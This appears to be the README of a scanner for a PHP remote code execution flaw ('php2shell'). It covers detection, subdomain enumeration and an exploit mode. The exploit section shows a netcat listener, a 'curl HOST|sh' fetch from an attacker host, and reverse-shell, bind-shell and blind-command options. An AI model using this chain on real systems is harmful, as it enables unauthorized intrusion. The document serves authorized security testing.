# php2shell-scanner

Check a domain and known subdomains for php2shell (CVE-2026-109618 / CVE-2026-109619) — pure Python, no external tools.

# Installation

With Nix flakes:

```
nix profile install "github:heywoodlh/php2shell-scanner"
```

If you want to run manually, only Python 3.8+ is required: `python3 run.py`.

# Detection

Detection is a pure-Python port of the PHP2Shell nuclei template: a control request captures the PHP version, then crafted multipart probes look for the OOM fatal (`Allowed memory size of ... bytes exhausted ... Unknown`); with no crash, the version alone decides (`VULNERABLE` below the fixed patch releases, `EOL` for < 8.2, `FIXED` otherwise). A crash match on a *fixed* version is classified as fixed — memory exhaustion happens on fixed builds too, only the OOM longjmp corruption is version-dependent.

# Usage

Scan one or more URLs (repeat `--target` for several, scanned exactly as given):

```
php2shell-scanner --target "http://example.com"
php2shell-scanner -t "http://example.com" -t "http://localhost:9080"
```

Each `--target` is validated before scanning: it must be an `http://` or `https://` URL that answers an HTTP request. Untrusted TLS certificates are accepted (only reachability is checked). If a host does not respond, the scan aborts with an error. `--target` and `--domain` can be combined.

Scan a domain and all its subdomains (passive enumeration via Certificate Transparency logs on crt.sh — no amass needed):

```
php2shell-scanner --subdomain --domain example.com
```

Scan multiple domains and all their subdomains:

```
php2shell-scanner --subdomain -d example.com -d somedomain.com
```

## Paths

The detection probes trigger the bug with a multipart POST, so any endpoint served by PHP is worth probing. Paths apply only to `--domain` targets — each path is joined to every domain. A URL passed with `--target` is always scanned exactly as given, with no path expansion. By default the paths in [`paths.txt`](paths.txt) are used. Add your own:

```
php2shell-scanner --domain example.com -p /upload.php -p /api/index.php
```

Or supply a path file (one path per line; blank lines and `#` comments are ignored):

```
php2shell-scanner --domain example.com --path-file ./my-paths.txt
```

`--path` entries are combined with the path file. When no `--path` or `--path-file` is given, the bundled `paths.txt` is used; pass `--path-file` explicitly to replace the defaults.

## Exploitation

With `--exploit`, the scanner first verifies the vulnerability on a **single** `--target` (the flag is rejected with multiple targets or with `--domain`), then runs a pure-Python exploit chain against it (worker rotation → Set-Cookie heap leak → libphp leak → forged-carrier `system()` call). No payload has to be staged on the server and Metasploit is not used:

```
# terminal 1: serve the shell script and catch the connection
nc -lvnp 4444 < script.sh
# terminal 2:
php2shell-scanner --target http://localhost:9080 --exploit --lhost 10.0.0.1 --lport 4444
```

The executed command is limited to 14 bytes by the forged carrier, so the shell is delivered by making the target fetch it from the attacker: `curl HOST|sh` (curl is present in php:apache images). Because of the 14-byte budget the host must be expressible very shortly: an inet_aton short form (`10.1` for 10.0.0.1, `127.1` for 127.0.0.1), a short DNS name you control (≤5 chars), or `0:PORT` when the listener runs on the target's own loopback. `--lport 80` gives the most room (`curl 10.1|sh`). If nothing fits, the tool says so and suggests alternatives.

Options: `--lhost`/`--lport` (shell target), `--command 'id>/out/p1'` to run a single arbitrary ≤14-byte command blind instead of a shell, `--bind-port N` for a bind shell instead of a reverse shell, and `--profile` (`official` for the official `php:8.4/8.5-apache` images, `official83`, `lab`), `--zif-offset`/`--dtor-offset`/`--htdata-offset` for per-build calibration, `--retries`, `--huge-mb`.

## Bind shell

With `--bind-port`, the fetched script instead starts a PHP listener on the target (no `nc`/`socat` needed — a mod_php target always has PHP), and the scanner connects to `<target-host>:<bind-port>` and drives the session itself (one command per line, output returned per line; type `exit` to close). The shell session therefore needs no listener and no target egress at all — only the one-shot script fetch has to reach the attacker:

```
php2shell-scanner --target http://localhost:9080 --exploit --bind-port 5555 --lhost 10.0.0.1 --lport 4444
```

If you already serve the bind-shell script somewhere (any path, plain text), pass `--no-serve` and point `--lhost`/`--lport` at it. The scanner still connects to the bind port automatically after firing.

The chain requires the same conditions as the public PoCs: Apache prefork + mod_php, `display_errors=1`, `memory_limit=8M`, `max_input_vars=1000`, single worker, `KeepAlive Off`, and an amd64 PHP 8.4/8.5 build whose libphp offsets match the profile (heap geometry is build- and environment-sensitive; leaks are retried and rotate the worker between attempts). Authorized testing only.

## Tests and CI

`tests/unit_test.py` covers the pure functions (probe builder, version verdict, host short forms, subdomain filtering, detection classification with a stubbed HTTP layer):

```
python3 -m unittest tests.unit_test -v
```

`tests/integration.sh` spins up a live vulnerable container (official `php:8.4.26-apache` with the required php.ini/apache config under `tests/docker/`, host networking) and tests everything against it: vulnerable target detected, fixed target (`php:8.4.27-apache`) **not** reported vulnerable, blind command execution as www-data, and a full bind-shell session. GitHub Actions runs both suites on every push/PR (`.github/workflows/test.yml`).

## Logging

Write only the findings (matched results) to a file with `--log`:

```
php2shell-scanner --domain example.com --log findings.txt
```

Progress and status output still goes to the terminal; only matched results are written to the log file. Parent directories are created if needed.
